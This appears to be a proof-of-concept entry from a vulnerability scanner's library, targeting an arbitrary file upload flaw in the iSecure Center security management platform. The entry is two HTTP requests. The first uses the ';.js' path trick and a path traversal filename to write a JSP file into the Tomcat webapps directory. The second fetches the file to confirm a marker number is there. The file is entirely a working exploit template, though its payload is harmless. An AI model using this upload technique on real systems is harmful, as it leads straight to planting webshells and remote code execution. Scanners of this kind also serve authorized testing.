{
        'name': '综合安防管理平台 iSecure Center /center/api/files 任意文件上传',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/center/api/files;.js',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close',
                'Content-Type': 'multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c'
            },
            'data': """--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.jsp"
Content-Type: application/octet-stream

332299402
--ea26cdac4990498b32d7a95ce5a5135c--""",
            'dnslog': False,
            'sqltime': False,
            'filelocate': '/clusterMgr/153107606.jsp;.js'
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '/clusterMgr/153107606.jsp;.js',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close',
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': '332299402'
        }}]
    }